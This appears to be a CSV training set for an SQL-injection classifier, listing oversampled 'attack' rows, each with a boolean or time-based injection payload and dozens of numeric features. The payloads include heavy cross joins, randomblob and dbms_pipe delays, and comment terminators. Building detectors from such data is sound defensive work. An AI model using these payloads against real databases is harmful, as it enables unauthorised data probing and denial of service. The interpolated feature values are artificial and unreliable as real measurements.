id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000029,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000776,0.10452286165807714,137.0,28.513374612041574,3.3291818959630026,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000030,attack,boolean,"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000702,0.11581466772150852,113.0,32.48600492473502,3.8855789172728943,37.0,21.0,41.0,14.0,0.3274336283185841,0.18584070796460178,0.36283185840707965,0.12389380530973451,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000031,attack,boolean,"1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000178,0.33137861463151014,161.73833456607136,32.85864591037946,4.042012917245879,81.15187546227676,16.0,47.86916728303568,16.71729182075892,0.5019101904002776,0.09905185592216786,0.29570554716052877,0.10333240651702577,0.8586459103794598,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.85864591037946,0.0,-1.1102230246251565e-16,2.0,5.0,0.8586459103794599,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000032,attack,boolean,"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",nearest_attack_euclidean,R000309,1.004920004749156,149.65153882294135,30.32576941147068,4.040492714825254,74.6288470573534,10.0,43.348461177058645,21.674230588529323,0.4986059770421324,0.0668245082790607,0.2897130097858713,0.14485650489293564,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.674230588529321,0.0,6.0,0.0,5.0,4.0,2.674230588529321,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.325769411470679,0.6742305885293209,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000033,attack,boolean,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",nearest_attack_euclidean,R000104,0.08869458556128831,150.35881083367107,29.960132129592104,4.014776993826125,73.84052851836842,10.0,44.398678704078975,22.119603611223692,0.4913304474628414,0.06652428141520988,0.2950799257512032,0.14706534537074564,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.079735740815795,0.0398678704078978,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000034,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000455,0.8430651741662629,139.93728335047464,33.0,4.172427668227717,71.0,9.0,41.18364511215558,18.753638238319052,0.5092335364791366,0.06455072997622859,0.29235706509757,0.1338586684470648,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.753638238319053,1.0,-1.1102230246251565e-16,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000135,0.19795167182798173,124.23814728560242,28.847629457120487,4.223789593583468,72.0,11.847629457120485,28.695258914240974,11.69525891424097,0.5796568930291083,0.0953397276475221,0.23093340619984343,0.09406997312352615,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.0,0.0,-1.1102230246251565e-16,2.8476294571204854,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000194,0.06189192409590653,94.5435735106409,28.0,3.5755965453051632,32.0,13.0,38.634858808512725,10.908714702128181,0.3385503681473089,0.13753608705984424,0.4085511368296741,0.11536240796317278,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.908714702128181,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000708,1.118317544431222,139.99211352561855,31.583661936432563,3.479907376143394,35.0,23.0,64.32676127134877,17.665352254269756,0.25176203929087665,0.16544362581971897,0.4568891412507844,0.12590519363861996,2.0,0.0,0.0,1.0,0.0,2.0,0.0,11.665352254269756,0.0,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,boolean,"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000727,0.16920559402159505,148.49408962091238,32.0,4.095035731415206,68.99763584836495,18.0,41.33018113115327,20.16627264139416,0.464734822583138,0.1213777923433837,0.27799042203317803,0.13589696304030033,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.166272641394158,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,1.2775331410699076,126.1108729536236,28.760702080490493,3.835979884016087,49.95719167803803,14.0,44.914383356076065,17.239297919509507,0.3962997251118556,0.11121758600246709,0.35567321949973346,0.13680946938594382,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.7607020804904918,0.0,9.478595839019016,0.0,1.0,3.0,0.7607020804904918,1.0,0.0,0.0,0.0,0.0,0.7607020804904918,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,boolean,"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000551,0.18261132818382808,118.493445550296,33.0,3.4868365861375374,31.0,15.0,54.794756440236796,17.6986891100592,0.2617176223145525,0.12663755918446087,0.46229984217477105,0.14934497632621566,2.0,0.0,2.0,1.0,0.0,1.0,0.0,10.698689110059199,0.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000041,attack,boolean,"1'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000533,0.4030414566124353,111.3439339631909,33.0,3.6245198481486347,31.0,15.0,48.34393396319091,17.0,0.2786069443271705,0.1348098117712115,0.43379879056091164,0.1527844533407064,2.6093443394681817,0.0,2.0,1.0,0.0,1.0,0.0,9.390655660531818,0.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000042,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000388,0.33166050775399736,145.14690356547572,31.146903565475743,4.024287179529691,71.0,9.0,47.0,18.146903565475743,0.48916248686118197,0.062006512419023066,0.32381178707712044,0.1250192136426745,0.0,0.14690356547574202,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.0,0.0,-1.1102230246251565e-16,3.0,4.0,0.0,0.14690356547574202,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000218,0.35328852217533013,143.61133885340757,31.435223142234594,4.015359195351556,70.02328099782108,8.717611571117297,46.43522314223459,18.435223142234594,0.48744801759810297,0.06066953143227889,0.3235699105970436,0.12831254037257453,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.0,0.0,-1.1102230246251565e-16,2.7176115711172972,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000282,0.12421922599006095,131.57632969268613,30.0,3.9530394196538947,66.57632969268613,8.0,41.0,16.0,0.5057530280754968,0.060830396544554244,0.31175578229084044,0.12166079308910849,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000656,0.8430371986836689,146.3987751678244,33.398775167824404,3.8127622890698563,41.0,24.0,56.0,25.398775167824404,0.28006011639731615,0.1639376291106241,0.3825211345914562,0.17348111990060353,0.3987751678244049,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.0,0.3987751678244048,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",nearest_attack_euclidean,R000499,0.4042887064803078,149.7774112503704,30.777411250370378,4.0305701072766595,76.10964500148151,10.0,42.445177499259245,21.222588749629622,0.5081246569997184,0.06676625894838015,0.28340605603460095,0.14170302801730048,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.222588749629622,0.0,6.0,0.0,5.0,4.0,2.2225887496296224,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000511,1.1113765208042738,137.4486052236386,30.0,4.029795457082265,74.44860522363861,8.0,37.0,18.0,0.5416408615830547,0.058204335037072424,0.26919504954645995,0.13095975383341293,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,1.9999999999999998,-1.1102230246251565e-16,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.448605223638608,0.5513947763613921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000048,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000146,0.635020119353202,74.6857385369062,29.0,4.042759966894774,22.794814013420435,16.0,24.192221020130653,11.698703503355109,0.30492494606985177,0.21527519774387693,0.3228404205148545,0.1569594356714168,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.3012964966448912,0.0,3.3974070067102176,0.0,1.0,1.0,2.301296496644891,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000223,0.20547231846262357,143.36911517204436,30.673823034408873,4.083943883921206,67.0,18.0,38.69529213763549,19.673823034408873,0.46745168884103583,0.12558403580803948,0.26975629325494443,0.13720798209598026,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.673823034408874,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000050,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",nearest_attack_euclidean,R000087,0.7098447018458198,129.82087507575463,31.452749949496923,3.537740295853946,40.18900020201231,15.81099979798769,57.0,16.820875075754618,0.3093250982605657,0.1220838162189822,0.4391126450952541,0.12947844042519802,2.820875075754616,0.0,0.0,1.0,0.0,1.0,0.0,11.0,0.0,-1.1102230246251565e-16,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000243,0.059417274868856576,130.7539993417917,30.0,3.961950175163982,65.7539993417917,8.0,41.0,16.0,0.5027518224152981,0.06119977570273254,0.3136488504765042,0.12239955140546507,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000095,0.486368049881981,111.67920345032644,33.0,3.6139267862619517,31.0,15.0,48.75940258774483,16.91980086258161,0.2779330055108461,0.1344837123439578,0.4362046711974318,0.15137861094776428,2.459900431290805,0.0,2.0,1.0,0.0,1.0,0.0,9.459900431290805,0.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000053,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,0.002358647769452207,145.96523069325275,30.0,4.039018558619883,84.96523069325274,8.0,38.0,15.0,0.5820872707346219,0.05480822678890204,0.26033907724728467,0.10276542522919133,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",nearest_attack_euclidean,R000735,0.034564186685096164,159.1752561389394,30.980527095673402,4.141700654024561,83.0,8.980527095673402,47.19472904326599,20.0,0.521468019634173,0.056428814875771796,0.296448220999893,0.12565494449016218,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.038945808653198,0.0,-1.1102230246251565e-16,2.980527095673401,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000055,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000690,0.038978267584294984,123.69649984044658,31.0,4.107863056374651,65.0,8.0,34.75719987235726,15.939299968089315,0.5255304628877048,0.06468067235540982,0.2809376043478362,0.12885126040904918,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.9392999680893155,1.0,-1.1102230246251565e-16,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,1.2719148358484158,126.09719202966409,28.761754459256608,3.8361569297054197,49.95298216297357,14.0,44.90596432594713,17.238245540743392,0.39630884723769777,0.11122903584317925,0.35564648223433415,0.13681563468478883,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.7617544592566082,0.0,9.476491081486783,0.0,1.0,3.0,0.7617544592566081,1.0,0.0,0.0,0.0,0.0,0.7617544592566081,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R000145,0.04786018282032575,93.0,22.802105419583356,3.064059489481437,13.0,16.0,48.0,16.0,0.13978494623655913,0.17204301075268819,0.5161290322580645,0.17204301075268819,4.0,0.0,1.0,-1.3877787807814457e-17,1.0,2.0,0.0,8.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
